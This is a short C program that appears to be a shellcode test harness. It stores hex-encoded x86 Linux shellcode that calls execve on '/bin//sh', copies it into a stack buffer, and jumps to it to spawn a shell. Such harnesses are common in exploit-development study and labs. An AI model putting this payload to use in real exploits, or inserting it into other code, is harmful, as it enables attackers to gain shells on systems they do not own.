#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char code[] =
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80";

int main(int argc, char **argv) {
	char buffer[500];
	strcpy(buffer, code);

	((void(*)())buffer)();

	return 0;
}

